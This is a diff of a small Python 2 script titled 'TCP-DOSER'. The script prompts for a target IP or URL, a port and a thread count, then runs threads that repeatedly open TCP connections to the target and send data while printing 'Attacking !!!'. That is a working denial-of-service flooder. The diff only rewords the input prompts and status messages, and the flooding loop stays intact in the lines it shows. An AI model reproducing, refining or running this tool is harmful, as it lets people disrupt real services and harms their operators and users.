@@ -8,10 +8,9 @@ print (" ╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╔═╗╦═
 print ("  ║ ║  ╠═╝───║║║ ║╚═╗║╣ ╠╦╝ ")
 print ("  ╩ ╚═╝╩    ═╩╝╚═╝╚═╝╚═╝╩╚═ ")
 time.sleep(0.5)
-print (" ")
-ip = raw_input("IP : ")
-port = input("Port : ")
-thread_num = input("Threads : ")
+ip = raw_input("Url/ip:")
+port = input("Port:")
+thread_num = input("Threads:")
 print "Attacking !!! Thread:",thread_num
 
 def run():
@@ -21,10 +20,10 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
-			print "Sent Package !"
+			print "Request send!"
 		except:
 			s.close()
-			print "Error , Socket Closed"
+			print "Error, socket close"
 			
 for i in range(thread_num):
     th = threading.Thread(target = run)
